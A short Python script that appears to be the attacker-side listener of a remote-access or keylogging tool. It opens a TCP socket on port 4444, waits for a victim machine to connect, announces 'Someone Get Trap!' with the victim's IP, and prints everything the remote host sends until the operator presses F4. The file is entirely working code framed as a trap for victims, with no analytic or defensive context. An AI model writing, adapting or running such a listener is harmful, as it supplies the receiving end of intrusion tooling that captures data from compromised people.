import socket
import keyboard


def opentrap(ip , port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip  ,port))
    print("WAITING . . .")
    s.listen(1)
    conn, addr = s.accept()
    return conn, addr

def trapping(conn, addr):
    print("[+] Someone Get Trap!, IP : ", addr)
    while (1):
        if keyboard.is_pressed("F4"):
            conn.close()
            break

        output = conn.recv(65535).decode()
        print(output)







if __name__ == "__main__":
    ip = "0.0.0.0"
    port = 4444
    conn, addr = opentrap(ip , port)
    trapping(conn, addr)